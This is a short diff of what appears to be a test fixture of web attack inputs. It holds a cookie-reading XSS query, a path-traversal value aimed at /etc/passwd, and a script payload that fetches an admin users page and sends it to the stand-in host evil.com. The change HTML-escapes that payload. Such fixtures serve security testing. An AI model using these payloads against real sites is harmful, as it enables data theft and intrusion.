@@ -498,7 +498,7 @@
                     query: "&lt;script&gt;alert('XSS');document.cookie&lt;/script&gt;",
                     path: "/comment",
                     method: "POST",
-                    body: "<script>fetch('/admin/users').then(r=>r.text()).then(d=>fetch('//evil.com/?'+btoa(d)))</script>"
+                    body: "&lt;script&gt;fetch('/admin/users').then(r=&gt;r.text()).then(d=&gt;fetch('//evil.com/?'+btoa(d)))&lt;/script&gt;"
                 },
                 path: {
                     query: "file=../../../../etc/passwd",
